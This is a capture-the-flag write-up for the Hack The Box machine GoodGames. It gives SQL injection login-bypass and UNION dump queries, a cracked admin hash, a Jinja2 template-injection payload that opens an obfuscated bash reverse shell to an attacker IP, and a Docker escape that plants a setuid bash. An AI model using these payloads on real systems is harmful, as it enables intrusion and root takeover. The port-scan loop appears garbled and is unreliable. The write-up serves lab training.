GoodGames (HTB – Easy)

The machine exposes a Python web application vulnerable to SQL injection in the login form. Dumping the database reveals admin credentials. After logging in, the application is vulnerable to Server‑Side Template Injection (SSTI), which provides a shell inside a Docker container. Privilege escalation is achieved by escaping the container through a mounted host directory.

Overview

Target: goodgames.htb
Initial vector: SQL injection → admin credential dump
Privilege escalation: Docker escape via mounted home directory

Enumeration

Nmap:

80/tcp open  http  Apache 2.4.51
Server: Werkzeug / Python 3.9.2

Add the domain to /etc/hosts and inspect the site. The login form is vulnerable to SQL injection.

SQL Injection

Authentication bypass:

email: admin' or 1=1-- -
password: anything

Manual enumeration confirms UNION‑based SQL injection. Example queries: 

' union select 1,2,3,database()-- -
' union select 1,2,3,schema_name from information_schema.schemata-- -

Automated enumeration using curl loops reveals the user table. Dumping it: 

' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user-- -

Recovered admin hash: 

admin : 2b22337f218b2d82dfc3b6f77e7cb8ec

Crack it:

$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hash.txt
-> superadministrator

Login as admin.

SSTI (Server‑Side Template Injection)

Inside the admin panel, the settings page contains an input field rendered by Jinja2.

Test:

{{4+4}}
-> 8

Use SSTI to execute a reverse shell: 

{{config.__class__.__init__.__globals__['os'].popen(
'echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8KALI_IP/4444${IFS}|base64${IFS}-d|bash'
).read()}}

Listener: 

$ nc -lvvp 4444

A shell is obtained inside a Docker container.

Privilege Escalation (Docker Escape)

Inside the container, the user’s home directory is mounted from the host with read/write permissions.

Check UID:

$ ls -l
-> UID 1000 (host user)

Check network: 

Container IP: 172.19.0.2
Host (likely): 172.19.0.1

Scan host ports:

for PORT in {0..1000}; do
  timeout 1 bash -c "/dev/null" && echo "port $PORT open"
done

Port 22 is open → SSH to host as augustus. 

$ ssh augustus@172.19.0.1

To escalate, abuse the mounted directory: 

# On host (as augustus)
cp /bin/bash .

# Exit to container (root inside container)
chown root:root bash
chmod 4755 bash

Back on host: 

$ ./bash -p
-> root

Conclusion

The machine combines SQL injection, SSTI, and Docker misconfiguration. After dumping admin credentials and exploiting Jinja2 SSTI, the container environment exposes a writable host directory. By modifying file permissions from inside the container, it is possible to obtain a root shell on the host system.
